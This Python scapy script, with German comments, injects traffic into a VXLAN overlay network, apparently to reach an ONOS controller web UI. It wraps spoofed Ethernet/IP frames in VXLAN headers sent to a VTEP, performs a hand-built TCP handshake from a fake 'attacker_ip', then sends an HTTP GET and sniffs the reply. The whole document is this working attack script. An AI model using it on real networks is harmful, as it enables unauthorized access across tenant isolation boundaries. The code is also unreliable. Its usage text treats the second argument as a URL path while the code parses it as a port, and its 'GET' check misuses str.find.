#!/usr/bin/env python

"""
Usage:
./http.py 10.10.10.10 /onos/ui

"/onos/ui" is optional

 """
from scapy.all import *
import random
import sys


vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
mac_src = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
http_port = int(sys.argv[2])
s_port = random.randint(20000,65500)

VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)



dest = sys.argv[1]
getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
max = 1

# TCP-Flags
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                return GET_print(packet)

def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "*****************************************************************************************************\n\n"
    global http_answer 
    http_answer = packet1
    return ret


def custom_action(packet):
    #print(packet.summary())
    #print(packet[TCP].dport)
    global syn_ack_dport
    syn_ack_dport = packet[TCP].dport
    global syn_ack_ack
    syn_ack_ack = packet[TCP].ack
    global syn_ack_seq
    syn_ack_seq = packet[TCP].seq
    print("dport = " + str(syn_ack_dport))
    print("ack = " + str(syn_ack_ack))
    print("seq = " + str(syn_ack_seq))
    return

#SEND SYN
syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
send(syn)
#GET SYNACK : TCP flags SYN and ACK are set
sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=custom_action, count = 1)


#Send ACK
out_ack = send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A'))

#Send the HTTP GET
send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)

#Print the HTTP Reply
sniff(filter = "tcp port " + str(http_port), prn=http_header, count = 1)

print(http_answer)











